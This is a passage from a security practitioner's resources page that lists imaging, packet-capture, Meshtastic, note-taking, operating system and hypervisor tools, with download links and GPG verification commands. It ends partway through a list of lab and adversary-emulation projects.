have a gmail, microsoft or a gitlab account you can ssh with that account.</p> <ul> <li>https://github.com/openpubkey/opkssh</li> </ul> Etcher <p>Etcher is a powerful OS image flasher built with web technologies to ensure flashing an SDCard or USB drive is a pleasant and safe experience. It protects you from accidentally writing to your hard-drives, ensures every byte of data was written correctly, and much more. It can also directly flash Raspberry Pi devices that support USB device boot mode.</p> <p>Etcher is one of the two go-to GUI-based imaging utilities for creating bootable media (the other being Rufus), with Etcher's main difference from Rufus being that it works across Windows macOS and Linux.</p> <ul> <li>https://github.com/balena-io/etcher</li> </ul> <p>Supported OS's:</p> <ul> <li>Linux; most distros; Intel 64-bit.</li> <li>Windows 10 and later; Intel 64-bit.</li> <li>macOS 10.13 (High Sierra) and later; both Intel and Apple Silicon.</li> </ul> Rufus <p>Rufus is a utility that helps format and create bootable USB flash drives.</p> <p>Rufus is possibly the best imaging utility if you're on Windows, allowing you to not only flash external media with any image file you have available, but with the options to customize Windows images during the process. All features are listed in the README.</p> <ul> <li>https://github.com/pbatard/rufus</li> </ul> <p>Rufus also has extensive documentation on its security model, from how it does what it does, to verifying signatures and how this works in Windows world, in a way that is useful and meaningful to a user. The concepts are not exclusive to Rufus.</p> etl2pcapng <p>This tool enables you to view ndiscap and pktmon packet captures with Wireshark. Due to performance problems with the other popular packet capture method (WinPcap, which was included with older versions of Wireshark), these inbox tools should be preferred.</p> <ul> <li>https://github.com/microsoft/etl2pcapng</li> </ul> <p>Here's how you can use this, taken from the README:</p> <p>\"pktmon\" is implemented as an integral part of the Windows operating system. It's capable of capturing packets in many components of the operating system, giving full visibility into the life of the packet as it traverses the system. A capture can be collected with:</p> <pre><code>pktmon start --capture\n&lt;repro&gt;\npktmon stop\n</code></pre> <p>\"ndiscap\" which is implemented as an ETW trace provider. A capture can be collected with:</p> <pre><code>netsh trace start capture=yes report=disabled\n&lt;repro&gt;\nnetsh trace stop\n</code></pre>  Meshtastic <p>Meshtastic is a project that lets you use inexpensive LoRa radios as a long range off-grid communicator for areas without reliable cellular service. These radios are great for hiking, skiing, paragliding - essentially any hobby where you don't have reliable internet access. Each member of the mesh can send and view text messages and enable optional GPS based location features. The radios automatically create a mesh to forward packets as needed, so everyone in the group can receive messages from even the furthest member. The radios will optionally work with your phone, but no phone is required.</p> <p>These devices are becoming more and more popular, firmware was even custom built for DEFCON. There's an excellent official app for mobile devices as well as a web client to interact with the mesh (send and receive messages).</p> <ul> <li>https://meshtastic.org/</li> <li>https://github.com/meshtastic</li> </ul> <p>You can flash ESP32 firmware and review all supported devices on the web:</p> <ul> <li>https://flasher.meshtastic.org/</li> </ul> <p>nRF52 and RP2040 based devices have the easiest firmware upgrade process (drag &amp; drop). No driver or software install is required on any platform. It also appears to support OTA (over the air) updates through bluetooth</p> <p>There are three main ways to interact with \"nodes\", all effectively offering the same capabilities:</p> <ul> <li>Web Client</li> <li>iOS Client</li> <li>Android Client</li> <li>Meshtastic CLI</li> </ul> <p>Install the command line tool with:</p> <pre><code># Using a venv\npython3 -m pip install --upgrade \"meshtastic[cli]\"\n\n# Using pipx\npipx install \"meshtastic[cli]\"\n</code></pre> <p>Setup Notes &amp; Considerations</p> <ul> <li>It's a good idea to factory erase and flash devices before first use</li> <li>Common USB class codes include:<ul> <li><code>{ 02:??:?? 0a:??:?? }</code> for CDC communication + CDC data</li> <li><code>{ 08:??:?? }</code> for USB mass storage when in DFU mode.</li> </ul> </li> <li>Devies appear to have <code>region: UNSET</code> by default until configured, so they aren't sending data until you complete setup</li> <li>Change the default BLE static pairing PIN on any new / flashed device: <code>meshtastic --set bluetooth.fixed_pin &lt;6_digit_pin&gt;</code><ul> <li>The default PIN is always <code>123456</code></li> </ul> </li> <li>You can enumerate a device's info with <code>meshtastic --port /dev/tty[YOUR_DEVICE]0 --info</code></li> <li>You can watch a stream of device activity over serial with <code>meshtastic --noproto</code></li> <li>PKI exists per-device (user identity) and per-channel (group identity)</li> <li>Configuration tips on node roles, (not) location sharing, rebroadcasting traffic, channels, and best practices<ul> <li>You can completely disable location sharing on public channels, and enable it for private channels</li> <li>Client roles + comparison, and what the rebroadcast mode means</li> <li>Tips on rebroadcasting traffic</li> </ul> </li> <li>MQTT is off by default, it's a bridge to the internet for meshtastic<ul> <li>Connecting a node to the public MQTT server may publish the locations of all nodes in your mesh to the internet.</li> </ul> </li> </ul> <p>Vulnerabilities</p> <ul> <li>DEFCON 33 Blog Post with Findings and Fixes</li> <li>GitHub: Meshtastic Firmware SECURITY.md</li> </ul> <p>Security Considerations</p> <p>While Meshtastic states this is not as secure as something like Signal, in other ways it's something that could be life saving in the right situation where you have no traditional network or cell service, and you're able to coordinate with your group or get a message to another node during an emergency. There are obviously no guarantees, as this is not designed to be an emergency service, but it's a use case one can imagine while hiking or camping in remote areas. Examples in the Wikipedia entry for Meshtastic suggest it's being explored as a backup communications system during natural disasters.</p> <ul> <li>Comparison to WPA3, TLS1.3, and Signal<ul> <li>If you have physical access to a node via a client application, you can dump all the private keys and PINs</li> <li>Change your keys from time to time</li> <li>Rotating your device's private key appears to rotate the (user's) identity in the network</li> </ul> </li> <li>Meshtastic does not implement network auth, so it is trivial to impersonate anyone else if you have access to the channel key</li> <li>DM's use PKC to encrypt and validate messages, which makes them harder to impersonate or modify</li> <li>Update your firmware regularly, follow any notices on GitHub and Discord</li> <li>You do not need to enable admin mode, or configure any remote administration to secure a personal (non-router) node</li> <li>Backup and restore your keys &amp; config using any of the client applications</li> </ul> <p>Device Support</p> <ul> <li>Supported Hardware Overview</li> <li>Meshtastic on Raspberry Pi</li> <li>Meshtastic on OpenWrt Routers</li> </ul>"},{"location":"blog/2019/07/15/-resources/#note-taking","title":"Note Taking","text":"<p>The best advice I've heard about note taking is 1) it should work for you, and 2) it should export to a common format like Markdown so you can move to another notes platform easily. This can be multiple apps, or just one. It's whatever works best for you and the goals you have.</p> Standard-Notes <p>Standard Notes is an end-to-end encrypted note-taking app for digitalists and professionals. Capture your notes, files, and life's work all in one secure place.</p> <p>It works across all major platforms, desktop and web, using end-to-end encrypted syncing through their servers to all of your devices. Robust markdown formatting, a secrets vault, and even limited spreadsheet capability for paid subscriptions. Standard Notes is one of the most security and privacy focused of the various note taking applications, making efforts to function similar to a password manager with how it handles memory and data on-device.</p> <p>You could also self-host the client and server components, using tailscale to safely access it from your endpoints.</p> <ul> <li>https://standardnotes.com/</li> <li>https://github.com/standardnotes/app</li> <li>License: AGPL-3.0</li> </ul> Obsidian <p>Perhaps the most popular notes application for infosec professionals and developers (as of the time of writing this). Obsidian features robust note taking and visualization capabilities through linking notes and creating a graph of how they relate. It works using markdown files saved to your device. Paid plans include end-to-end encrypted note sync.</p> <ul> <li>https://obsidian.md/</li> <li>https://github.com/obsidianmd</li> </ul> Joplin <p>Joplin is a free, open source note taking and to-do application, which can handle a large number of notes organised into notebooks. The notes are searchable, can be copied, tagged and modified either from the applications directly or from your own text editor. The notes are in Markdown format. The notes can be securely synchronised using end-to-end encryption with various cloud services including Nextcloud, Dropbox, OneDrive and Joplin Cloud.</p> <p>This application is often referenced in relation to note taking for pentesting courses and certifications. It's fairly easy to install and functions entirely offline by default.</p> <ul> <li>https://github.com/laurent22/joplin</li> <li>License: AGPL-3.0-or-later</li> </ul> Notion <p>Notion is a note taking platform. Desktop apps are available but you can use it entirely through the web application. It is possibly the most feature-rich note taking platform available. If your subscription includes the AI component, it's practical and immediately usable out of the box.</p> <p>These notes are not end-to-end encrypted, and may not be the best option without an enterprise subscription if your notes include customer data.</p> <ul> <li>https://www.notion.com/</li> </ul> Cherrytree <p>A hierarchical note taking application, featuring rich text and syntax highlighting, storing data in either a single file (xml or sqlite) or multiple files and directories.</p> <p>This is often available by default in Kali Linux and frequently referenced in relation to note taking for pentesting courses and certifications.</p> <p>Primarily supports Windows and Linux (snap and flatpaks are available too).</p> <ul> <li>https://github.com/giuspen/cherrytree</li> <li>License: GPL-3.0</li> </ul> <p>Tips</p> Markdown Syntax Highlighting <ul> <li>GitHub: Basic Writing and Formatting</li> <li>GitHub: Creating and Highlighting Codeblocks</li> <li>github-linguist: Supported Languages</li> </ul>"},{"location":"blog/2019/07/15/-resources/#operating-systems","title":"Operating Systems","text":"Windows <p>Each of the ISOs and disk images are openly available to download, both for evaluation and to enter a product key during install for produciton use.</p> <ul> <li>Direct Download Links to ISO's / VHD's</li> <li>Windows ISOs (Production Use)</li> <li>Windows ISOs (Evaluation Use)</li> <li>Windows Developer Evaluation VM</li> <li>Windows 7/8/10 Legacy VM</li> </ul>  ReactOS <p>ReactOS is an Open Source effort to develop a quality operating system that is compatible with applications and drivers written for the Microsoft Windows NT family of operating systems (NT4, 2000, XP, 2003, Vista, 7).</p> <p>The ReactOS project, although currently focused on Windows Server 2003 compatibility, is always keeping an eye toward compatibility with Windows Vista and future Windows NT releases.</p> <p>The code of ReactOS is licensed under GNU GPL 2.0.</p> <ul> <li>https://github.com/reactos/reactos</li> </ul>  Kali Linux <p>The most robust pentesting Linux distribution. Includes tools for offense, purple teaming, defense, and forensics.</p> <ul> <li>https://cdimage.kali.org/</li> <li>https://www.kali.org/downloads/</li> <li>https://www.kali.org/docs/introduction/download-images-securely/</li> <li>For older images of kali: https://old.kali.org/</li> <li>A New Kali Linux Archive Signing Key</li> </ul> <p>Obtaining the Kali Linux GPG public key and verifying signatures:</p> <pre><code>wget -q -O - https://archive.kali.org/archive-key.asc | gpg --import\ngpg --keyserver hkps://keyserver.ubuntu.com --recv-key 827C8569F2518CC677FECA1AED65462EC8D5E4C5\nwget -q https://cdimage.kali.org/current/SHA256SUMS{.gpg,}\ngpg --verify SHA256SUMS.gpg SHA256SUMS\n</code></pre> <p>Current GPG Key File: 0xED65462EC8D5E4C5</p> <pre><code>pub   rsa4096/ED65462EC8D5E4C5 2025-04-17 [SC] [expires: 2028-04-17]\n    Key fingerprint = 827C 8569 F251 8CC6 77FE  CA1A ED65 462E C8D5 E4C5\nuid                 [ unknown] Kali Linux Archive Automatic Signing Key (2025) &lt;devel@kali.org&gt;\n</code></pre> <p>(Previous) GPG Key File: 0xED444FF07D8D0BF6</p> <pre><code>pub   rsa4096/0xED444FF07D8D0BF6 2012-03-05 [SC] [expires: 2027-02-04]\n      Key fingerprint = 44C6 513A 8E4F B3D3 0875  F758 ED44 4FF0 7D8D 0BF6\nuid                             Kali Linux Repository &lt;devel@kali.org&gt;\nsub   rsa4096/0xA8373E18FC0D0DCB 2012-03-05 [E] [expires: 2027-02-04]\n</code></pre> <p>Kali Vagrant Rebuilt: Out With Packer, In With DebOS</p> <p>This is a good example of using DebOS to replace the steps packer takes to automate building a VM.</p>  REMnux <p>A Linux toolkit for malware analysts. Lenny Zeltser is one of the maintainers.</p> <ul> <li>https://remnux.org/</li> </ul>  Debian <p>Debian is one of the \"main\" operating system families of Linux.</p> <p>The Debian Project is an association of individuals, sharing a common goal: We want to create a free operating system, freely available for everyone. Now, when we use the word \"free\", we're not talking about money, instead, we are referring to software freedom.</p> <ul> <li>https://www.debian.org</li> <li>https://www.debian.org/CD/verify</li> <li>https://cdimage.debian.org/debian-cd/current-live/amd64/iso-hybrid/</li> <li>For older images of Debian: https://cdimage.debian.org/mirror/cdimage/archive/</li> <li>Package Search</li> </ul> <p>GPG Key:</p> <pre><code>gpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys 'DF9B 9C49 EAA9 2984 3258  9D76 DA87 E80D 6294 BE9B'\n</code></pre> <p>To automate installs, Debian uses <code>preseed.cfg</code> files.</p> <ul> <li>debian.org/DebianInstaller/Preseed</li> <li>debian.org example-preseed.txt Template</li> <li>debian.org/tasksel</li> </ul>  Ubuntu <p>Ubuntu is a Debian-base Linux distribution developed by Canonical.</p> <ul> <li>https://releases.ubuntu.com (main images)</li> <li><code>https://old-releases.ubuntu.com/releases/$VERSION/</code> (is how you can version pin URLs to ISOs and signatures, this contians all released images in one page per version)</li> <li>https://cdimage.ubuntu.com/releases/ (rpi + alternate flavors)</li> <li>https://cloud-images.ubuntu.com/ (vagrant and cloud provider images)</li> <li>https://ubuntu.com/download/raspberry-pi</li> <li>https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi</li> <li>Package Search</li> </ul> <p>GPG Key File: 0xD94AA3F0EFE21092</p> <pre><code>pub   rsa4096/0xD94AA3F0EFE21092 2012-05-11 [SC]\n      Key fingerprint = 8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092\nuid   Ubuntu CD Image Automatic Signing Key (2012) &lt;cdimage@ubuntu.com&gt;\n</code></pre> <p>Ubuntu Pro and ESM (Extended Security Maintenance)</p> <p>Ubuntu Pro is free for personal use, and for up to 5 devices. It provides access to STIG and CIS configuraton automation and auditing, live-patching the kernel without a need to reboot, and extended security maintenance on older distros and packages.</p> <p>Something to be aware of is the ESM repos are pinned with a slightly higher priority; <code>510</code>. If you're installing a tool from a third-party repo that also exists in the ESM repo, like the GitHub CLI tool (<code>gh</code>), you may find the ESM version gets installed by default. You'll need to set a higher priority for these packages if you want to use a third-party apt repo instead.</p> <p>Open Kernel NVIDA Drivers &amp; Wayland</p> <ul> <li>github.com/NVIDIA/open-gpu-kernel-modules</li> </ul> <p>In 2022 NVIDIA moved to GPL/MIT open-sourced kernel drivers on Linux. This is important to note if you're ever experiencing performance issues with the fully proprietary drivers. For example, one issue recently encountered was moving to Wayland on a host with an NVIDIA GPU. The performance was very rough compared to X11, which led to a few questions.</p> <p>NOTE: ChatGPT o3 put together an initial set of suggestions and ideas to resolve performance issues with Wayland on an Ubuntu desktop running an NVIDIA GPU. Something that stood out was trying the open-kernel drivers for NVIDIA. The following references stemmed from this conversation:</p> <ul> <li>NVIDIA Developer Forum Post: Wayland vs X11 Performance</li> <li>NVIDIA Linux Driver 560.28.03 Release Details: Prefer Open-kernel by Default</li> <li>Ubuntu 24.10 Release Notes: Wayland is the Default for NVIDIA GPUs<ul> <li>Some NVIDIA desktops perform worse in Wayland sessions than Xorg (LP#2081140)</li> </ul> </li> <li>github.com/NVIDIA/open-gpu-kernel-modules/issues?q=Wayland</li> </ul> <p>Ultimately the order of operations for debugging performance issues on NVIDIA desktops seems to be this;</p> <ul> <li>Update your system packages, firmware, and Kernel</li> <li>Update your NVIDIA drivers to the latest tested open kernel modules</li> <li>Confirm the performance issues are only present on Wayland and not Xorg</li> <li>Review Ubuntu and NVIDIA driver release notes for any warnings</li> <li>Review the NVIDIA open-gpu-kernel-modules repo for any issues or warnings</li> </ul>  Pop!_OS <p>Pop!_OS is engineered and designed in-house by System76, the US computer manufacturer. From our factory in Colorado, we craft open source software, repairable computers, and airtight firmware-with the aim of empowering users' ambitions on the best-quality product we can muster.</p> <p>Pop!_OS is focused on the desktop experience. It's built on Ubuntu, but functions in a very unique way. It's lighter weight, strong GPU support with easy CUDA and TensorFlow install, replacing GRUB with systemd-boot, and creating recovery partitions for reinstalling the OS to name a few.</p> <ul> <li>https://system76.com/pop/</li> <li>https://github.com/pop-os</li> </ul> <p>GPG Key File: 0x204DD8AEC33A7AFF</p> <pre><code>pub   rsa4096/0x204DD8AEC33A7AFF 2017-06-22 [SC]\n    Key fingerprint = 63C4 6DF0 140D 7389 6142  9F4E 204D D8AE C33A 7AFF\nuid                   [ unknown] Pop OS (ISO Signing Key) &lt;info@system76.com&gt;\nsub   rsa4096/0x49F26BFD279696B5 2017-06-22 [E]\n</code></pre> <p>To obtain the hashes + signature, replace the .iso file in the download URL with the following patterns:</p> <pre><code>https://iso.pop-os.org/&lt;version&gt;/amd64/nvidia/&lt;build-num&gt;/SHA256SUMS\nhttps://iso.pop-os.org/&lt;version&gt;/amd64/nvidia/&lt;build-num&gt;/SHA256SUMS.gpg\nhttps://iso.pop-os.org/&lt;version&gt;/amd64/intel/&lt;build-num&gt;/SHA256SUMS\nhttps://iso.pop-os.org/&lt;version&gt;/amd64/intel/&lt;build-num&gt;/SHA256SUMS.gpg\n</code></pre>  Raspberry Pi OS <p>Raspberry Pi needs an operating system to work. This is it. Raspberry Pi OS (previously called Raspbian) is our official supported operating system.</p> <p>Many Linux distributions have a version available to run on Raspberry Pi, however there's also Raspberry Pi OS which is built and maintained by the Raspberry Pi Foundation.</p> <ul> <li>Verify the .sig file against the img.xz compressed file, not the SHA signatures.</li> <li>https://www.raspberrypi.org/about/ links to raspberrypi.com</li> <li>https://www.raspberrypi.com/</li> <li>https://www.raspberrypi.com/software/operating-systems/ (links to main images, use the archive link to obtain the .sig)</li> <li>https://downloads.raspberrypi.com/raspios_arm64/images/ (folder for standard desktop download)</li> <li>https://github.com/raspberrypi</li> <li>https://www.raspberrypi.org/raspberrypi_downloads.gpg.key GPG key, indexed by search engines, deprecated as of November 24th 2025</li> <li>Current Raspberry Pi OS and Imager signing key</li> </ul> <pre><code># Previous Signing Key\npub   rsa2048/0x8738CD6B956F460C 2017-04-10 [SC] [expires: 2031-04-07]\n    Key fingerprint = 54C3 DD61 0D9D 1B4A F82A  3775 8738 CD6B 956F 460C\nuid                   [ unknown] Raspberry Pi Downloads Signing Key\nsub   rsa2048/0x287C051D4228C4CE 2017-04-10 [E] [expires: 2031-04-07]\n\n# Current Signing Key\n# See: https://www.raspberrypi.com/news/a-new-raspberry-pi-imager/ and https://forums.raspberrypi.com/viewtopic.php?t=394045\npub   rsa4096/0x796C114AD12B2292 2025-11-24 [SC] [expires: 2027-01-01]\n    Key fingerprint = F4AA DD86 C468 7D69 AE04  543E 796C 114A D12B 2292\nuid                   [ unknown] Raspberry Pi Downloads Signing Key\nsub   rsa4096/0x532141F79FA30644 2025-11-24 [E] [expires: 2027-01-01]\n</code></pre> <p>rpi-imager</p> <p>The Rapsberry Pi Imager is similar to etcher or rufus, in that it allows you to both, write the Raspberry Pi OS to an external device while simultaneously configuring it.</p> <ul> <li>https://downloads.raspberrypi.org/imager/</li> <li>https://github.com/raspberrypi/rpi-imager</li> </ul> <p>On Linux there's an AppImage binary available if you prefer installing something under a <code>local/</code> path instead of using <code>dpkg</code>. Regardless, each binary comes with a signature file. You can use the Raspberry Pi public key (above) to verify the file integrity.</p> <pre><code># Ensure jq is installed, on Ubuntu / Debian use apt\nsudo apt update; sudo apt install -y jq\n\n# Obtain the latest signing key\ngpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys 'F4AADD86C4687D69AE04543E796C114AD12B2292'\n\n# Set the version information using GitHub's API to obtain the latest release tag version\ngh_release_info=\"$(curl -Lf 'https://api.github.com/repos/raspberrypi/rpi-imager/releases/latest')\"\nlatest_version=\"$(echo \"$gh_release_info\" | jq -r '.tag_name' | sed 's/^v//')\"\n\n# Download from https://downloads.raspberrypi.org/imager/\ncd ~/Downloads\ncurl -LfO \"https://downloads.raspberrypi.org/imager/imager_${latest_version}_amd64.AppImage\"\ncurl -LfO \"https://downloads.raspberrypi.org/imager/imager_${latest_version}_amd64.AppImage.sig\"\n# If the download fails, the latest signed version may be one version behind, check this server manually\n\n# Verify the signature\ngpg --verify imager_${latest_version}_amd64.AppImage.sig imager_${latest_version}_amd64.AppImage\n\n# Install the AppImage locally without apt or dpkg\nsudo cp ./imager_${latest_version}_amd64.AppImage /usr/local/bin/rpi-imager\nsudo chmod +x /usr/local/bin/rpi-imager\nrpi-imager\n</code></pre>  RHEL (Red Hat Enterprise Linux) <p>Red Hat Enterprise Linux is an enterprise Linux operating system. It is oriented toward enterprise and commercial users, is certified for many hardware and cloud platforms, and is supported by Red Hat via various subscription options. Compared to Fedora, Red Hat Enterprise Linux emphasizes stability and enterprise-readiness over the latest technologies or rapid releases. More information about Red Hat offerings can be found at Red Hat's web site.</p> <p>Individual software developers can access a free-of-charge subscription as part of the Red Hat Developer Program. Developers can use Red Hat Enterprise Linux on up to 16 physical or virtual systems for development, quality assurance, demos, or small production uses. See the Frequently Asked Questions for the No-cost Red Hat Enterprise Linux Individual Developer Subscription.</p> <ul> <li>https://www.redhat.com</li> <li>https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux</li> </ul>  Fedora <p>Fedora is developed by the Fedora Project and sponsored by Red Hat. It follows its own release schedule, with a new version approximately every six months. Fedora provides a modern Linux operating system utilizing many of the latest technologies. It is free for all users and supported via the Fedora community.</p> <p>To create Red Hat Enterprise Linux, some version of Fedora is forked and enters an extensive development, testing and certification process to become a new version of Red Hat Enterprise Linux.</p> <ul> <li>https://getfedora.org</li> <li>https://fedoraproject.org/security (GPG Keys)</li> <li>https://docs.fedoraproject.org</li> <li>https://hub.docker.com/_/fedora</li> </ul> <p>To automate installs, Fedora uses Kickstart files.</p>  Rocky <p>Rocky Linux is an open-source enterprise operating system designed to be 100% bug-for-bug compatible with Red Hat Enterprise Linux. Rocky Linux is under intensive development by the community.</p> <ul> <li>https://rockylinux.org/</li> <li>https://docs.rockylinux.org/ (The documentation is very straight forward and easy to understand, if you're learning Fedora or RHEL start here)</li> </ul> <p>Brief history about Rocky Linux:</p> <p>On December 8, 2020, Red Hat announced that they would discontinue development of CentOS, which has been a production-ready downstream version of Red Hat Enterprise Linux, in favor of a newer upstream development variant of that operating system known as \"CentOS Stream\". In response, the original founder of CentOS, Gregory Kurtzer, announced via a comment on the CentOS website that he would again start a project to achieve the original goals of CentOS. Its name was chosen as a tribute to early CentOS co-founder Rocky McGaugh. By December 12, the code repository of Rocky Linux had become the top-trending repository on GitHub.</p> <p>Verifying Signatures</p> <p>Interestingly the way to verify the ISO hashes is through this git repo, where the commits of the hashes are signed. This is because Keykeeper (part of the peridot build system) does not sign arbitrary files or artifacts outside of the build system. So rather than having a CHECKSUMS and a detached CHECKSUMS.sig, hashes are commited here by the maintainers.</p> <ul> <li>https://rockylinux.org/resources/gpg-key-info</li> <li>https://github.com/rocky-linux/checksums</li> <li>GPG Key Fingerprints</li> </ul>  Pentoo <ul> <li>https://pentoo.ch/</li> </ul>  Parrot <p>Parrot Security (ParrotOS, Parrot) is a Free and Open source GNU/Linux distribution based on Debian Stable designed for security experts, developers and privacy aware people.</p> <p>It includes a full portable arsenal for IT security and digital forensics operations. It also includes everything you need to develop your own programs or protect your privacy while surfing the net.</p> <p>Parrot is available in three main editions, Security, Home and Architect Edition, even as Virtual Machine (Virtual Box, Parallels and VMware), on Raspberry Pi and also on Docker.</p> <p>The operating system ships by default with MATE Desktop Environment, but it is possible to install others DEs.</p> <ul> <li>https://www.parrotsec.org/</li> </ul>  Arch Linux <ul> <li>https://archlinux.org/</li> <li>https://archlinux.org/download/</li> </ul>  OpenBSD <ul> <li>https://www.openbsd.org/</li> <li>https://www.openbsd.org/faq/faq4.html#Download</li> </ul>  FreeBSD <ul> <li>https://www.freebsd.org/where/</li> <li>https://docs.freebsd.org/en/articles/pgpkeys/</li> <li>https://docs.freebsd.org/pgpkeys/pgpkeys.txt</li> </ul>  pfSense <p>pfSense is an excellent choice for both, a home and lab router-firewall to begin learning with and protect your real network.</p> <p>The pfSense project is a free network firewall distribution, based on the FreeBSD operating system with a custom kernel and including third party free software packages for additional functionality. pfSense software, with the help of the package system, is able to provide the same functionality or more of common commercial firewalls, without any of the artificial limitations. It has successfully replaced every big name commercial firewall you can imagine in numerous installations around the world, including Check Point, Cisco PIX, Cisco ASA, Juniper, Sonicwall, Netgear, Watchguard, Astaro, and more.</p> <ul> <li>https://www.pfsense.org/download/</li> <li>https://github.com/pfsense/</li> </ul>  OpenWRT <p>Tracking latest stable release notes</p> <ul> <li>https://openwrt.org/releases/start</li> <li><code>https://openwrt.org/releases/&lt;version&gt;/start</code></li> <li><code>https://openwrt.org/releases/&lt;version&gt;/notes-&lt;version&gt;</code></li> </ul> <p>Downloading latest stable releases</p> <ul> <li>https://downloads.openwrt.org/releases/</li> <li>https://openwrt.org/toh/views/toh_fwdownload (Ctrl+F search device name)</li> <li>https://openwrt.org/docs/guide-user/security/signatures</li> </ul> <p>For UniFi AP AC Lite:</p> <ul> <li><code>https://downloads.openwrt.org/releases/&lt;version&gt;/targets/&lt;target&gt;/&lt;type&gt;</code></li> <li>https://downloads.openwrt.org/releases/22.03.0/targets/ath79/generic/ (ath79 is the latest target)<ul> <li>ubnt_unifiac-lite-squashfs-sysupgrade.bin</li> <li>sha256sums</li> <li>sha256sums.asc</li> </ul> </li> </ul>  Ubiquiti <ul> <li>https://www.ui.com/download/</li> <li>https://dl.ui.com/unifi/firmware/U7PG2/3.7.58.6385/BZ.qca956x.v3.7.58.6385.170508.0957.bin (UniFi AP AC Lite firmware v3.7.58)</li> </ul>  VyOS <p>VyOS is a fully open-source Linux-based OS for network devices. It focuses on enterprise, service provider, and network geek audiences.</p> <p>It's free to build and use, and nightly prerelease ISO's are available, however they operate on a \"pay for prebuilt binaries\", plus technical support and custom development services if you'd like to support the project.</p> <ul> <li>https://github.com/vyos/</li> <li>https://vyos.net/get/nightly-builds/ (this details verifying the signatures with minisign)<ul> <li>https://github.com/vyos/vyos-nightly-build/blob/main/minisign.pub</li> </ul> </li> <li>https://github.com/vyos/vyos-nightly-build/releases</li> <li>VyOS History</li> </ul>  TrueNAS SCALE <ul> <li>https://github.com/truenas</li> <li>https://www.truenas.com/docs/</li> <li>https://www.truenas.com/download-truenas-scale/</li> <li>PGP Key: <code>C8D6 2DEF 767C 1DB0 DFF4 E6EC 358E AA91 12CF 7946</code></li> </ul>  openmediavault <p>openmediavault is the next generation network attached storage (NAS) solution based on Debian Linux. It contains services like SSH, (S)FTP, SMB/CIFS, RSync and many more. Thanks to the modular design of the framework it can be enhanced via plugins. openmediavault is primarily designed to be used in home environments or small home offices, but is not limited to those scenarios. It is a simple and easy to use out-of-the-box solution that will allow everyone to install and administrate a Network Attached Storage without deeper knowledge.</p> <p>Note: openmediavault (like other NAS solutions) expects to have full, exclusive control over OS configuration and cannot be used within a container. Also, no graphical desktop user interface can be installed in parallel.</p> <ul> <li>https://github.com/openmediavault/openmediavault</li> <li>https://docs.openmediavault.org/en/stable/installation/index.html</li> </ul>"},{"location":"blog/2019/07/15/-resources/#hypervisors","title":"Hypervisors","text":"Proxmox <p>Proxmox is a complete open-source platform for virtualization. Built on Debian, it uses a web frontend to manage VM's and containers. You can install and use GUI and headless VM's, as well as manage and work with the underlying OS from a shell. For example it's entirely possible to install an EDR agent onto Proxmox, since it's Debian under the hood.</p> <ul> <li>https://www.proxmox.com/en/</li> <li>https://pve.proxmox.com/pve-docs/</li> </ul> <p>The ISO URL points to an /iso/ folder on the Proxmox webiste. Browsing this manually reveals the following files:</p> <p>https://enterprise.proxmox.com/iso/SHA256SUMS.txt https://enterprise.proxmox.com/iso/SHA256SUMS.asc</p> <p>You can use these along with the following public key to verify the ISO's integrity.</p> <pre><code>gpg --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys 'F4E136C67CDCE41AE6DE6FC81140AF8F639E0C39'\n\n# list keys\npub   rsa4096/0x1140AF8F639E0C39 2022-11-27 [SC] [expires: 2032-11-24]\n    Key fingerprint = F4E1 36C6 7CDC E41A E6DE  6FC8 1140 AF8F 639E 0C39\nuid                   [ unknown] Proxmox Bookworm Release Key &lt;proxmox-release@proxmox.com&gt;\n</code></pre> VMware <p>\u26a0\ufe0f TO DO \u26a0\ufe0f</p> VirtualBox <p>VirtualBox is often available in the default Linux repositories, but the latest supported and patched version is available directly from VirtualBox's offical repo.</p> <p>VirtualBox is a general-purpose full virtualization software for x86_64 hardware (with version 7.1 additionally for macOS/Arm), targeted at laptop, desktop, server and embedded use.</p> <p>It works on Windows, macOS, Linux, and more. You'll also want the VirtualBox Extension Pack if you require USB pass-through or any other advanced features. It's free for personal use and is under a separate license agreement.</p> <ul> <li>https://www.virtualbox.org/</li> <li>https://www.virtualbox.org/download/oracle_vbox_2016.asc</li> </ul> <pre><code>B9F8 D658 297A F3EF C18D  5CDF A2F6 83C5 2980 AECF\nOracle Corporation (VirtualBox archive signing key) &lt;info@virtualbox.org&gt;\n</code></pre> QEMU <p>QEMU is available through your Linux distro's default package repos, and macOS's Homebrew / MacPorts. This is the recommended way to install it.</p> <p>QEMU could be thought of as the Hyper-V of Linux. It benefits from the KVM acceleration on Linux making the performance incredible, and in some sense is the most ubiquitously supported hypervisor across the distros, likely because of the KVM integration. You'll see this on Ubuntu where <code>apt</code> now checks to see if QEMU VM's are running.</p> <p>This is just my opinion and experience after moving to Hyper-V and QEMU from VMWare and VirtualBox. QEMU is also being used by Proxmox, which is another benefit to building and understanding QEMU images if you're using QEMU for desktop use cases and Proxmox as a virtualization server.</p> <ul> <li>https://www.qemu.org/download/</li> <li>https://www.qemu.org/documentation/</li> <li>https://gitlab.com/qemu-project/qemu</li> </ul> oVirt <p>oVirt is an open-source distributed virtualization solution, designed to manage your entire enterprise infrastructure. oVirt uses the trusted KVM hypervisor and is built upon several other community projects, including libvirt, PatternFly, and Ansible.</p> <ul> <li>Rich web-based user interfaces for both admin and non-admin users</li> <li>Integrated management of hosts, storage, and network configuration</li> <li>Live migration of virtual machines and disks between hosts and storage</li> <li>High availability of virtual machines in the event of host failure</li> </ul> <ul> <li>https://www.ovirt.org/</li> <li>https://github.com/oVirt</li> </ul>"},{"location":"blog/2019/07/15/-resources/#labs-simulations","title":"Labs &amp; Simulations","text":"Atomic Red Team <p>Invoke-AtomicReadTeam is an execution framework in PowerShell to run Atomic Tests, which are adversary emulation tests mapped to MITRE ATT&amp;CK.</p> <ul> <li>https://github.com/redcanaryco/atomic-red-team</li> </ul> PANIX (Persistence Against *NIX) <p>Customizable Linux Persistence Tool for Security Research and Detection Engineering.</p> <ul> <li>https://github.com/Aegrah/PANIX</li> <li>Linux Detection Engineering - A Primer on Persistence Mechanisms</li> <li>Linux Detection Engineering - A Sequel on Persistence Mechanisms</li> <li>Linux Detection Engineering - A Continuation on Persistence Mechanisms</li> <li>Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms</li> <li>Linux Detection Engineering - The Grand Finale on Linux 